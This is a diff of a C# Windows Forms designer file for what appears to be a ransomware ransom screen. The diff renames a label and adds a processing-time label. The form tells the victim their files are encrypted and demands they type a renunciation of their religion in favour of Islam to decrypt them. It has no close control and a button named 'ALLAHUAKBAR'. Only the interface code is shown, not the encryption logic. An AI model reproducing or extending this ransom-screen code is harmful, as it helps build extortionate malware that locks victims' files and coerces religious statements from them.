@@ -32,7 +32,8 @@
             this.label2 = new System.Windows.Forms.Label();
             this.txtWhatever = new System.Windows.Forms.TextBox();
             this.btnALLAHUAKBAR = new System.Windows.Forms.Button();
-            this.label3 = new System.Windows.Forms.Label();
+            this.labelPhrase = new System.Windows.Forms.Label();
+            this.labelTime = new System.Windows.Forms.Label();
             this.SuspendLayout();
             // 
             // label1
@@ -52,7 +53,7 @@
             this.label2.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.label2.Location = new System.Drawing.Point(12, 27);
             this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(433, 76);
+            this.label2.Size = new System.Drawing.Size(433, 67);
             this.label2.TabIndex = 1;
             this.label2.Text = "All of your files are now encrypted because you thought it would be a good idea t" +
     "o run random programs from the internet";
@@ -77,24 +78,38 @@
             this.btnALLAHUAKBAR.UseVisualStyleBackColor = true;
             this.btnALLAHUAKBAR.Click += new System.EventHandler(this.btnALLAHUAKBAR_Click);
             // 
-            // label3
+            // labelPhrase
             // 
-            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
-            this.label3.AutoSize = true;
-            this.label3.Location = new System.Drawing.Point(12, 107);
-            this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(334, 26);
-            this.label3.TabIndex = 4;
-            this.label3.Text = "To decrypt your files please enter the following into the textbox below:\r\n\'I deno" +
+            this.labelPhrase.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.labelPhrase.AutoSize = true;
+            this.labelPhrase.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.labelPhrase.Location = new System.Drawing.Point(12, 107);
+            this.labelPhrase.Name = "labelPhrase";
+            this.labelPhrase.Size = new System.Drawing.Size(349, 26);
+            this.labelPhrase.TabIndex = 4;
+            this.labelPhrase.Text = "To decrypt your files please enter the following into the textbox below:\r\n\'I deno" +
     "unce my religion and agree Islam is the one and true religion\'";
+            // 
+            // labelTime
+            // 
+            this.labelTime.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.labelTime.AutoSize = true;
+            this.labelTime.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.labelTime.ForeColor = System.Drawing.SystemColors.GrayText;
+            this.labelTime.Location = new System.Drawing.Point(12, 94);
+            this.labelTime.Name = "labelTime";
+            this.labelTime.Size = new System.Drawing.Size(96, 13);
+            this.labelTime.TabIndex = 5;
+            this.labelTime.Text = "Processing took 0s";
             // 
             // Main
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(457, 169);
+            this.ClientSize = new System.Drawing.Size(453, 165);
             this.ControlBox = false;
-            this.Controls.Add(this.label3);
+            this.Controls.Add(this.labelTime);
+            this.Controls.Add(this.labelPhrase);
             this.Controls.Add(this.btnALLAHUAKBAR);
             this.Controls.Add(this.txtWhatever);
             this.Controls.Add(this.label2);
@@ -114,6 +129,7 @@
         private System.Windows.Forms.Label label2;
         private System.Windows.Forms.TextBox txtWhatever;
         private System.Windows.Forms.Button btnALLAHUAKBAR;
-        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label labelPhrase;
+        private System.Windows.Forms.Label labelTime;
     }
 }
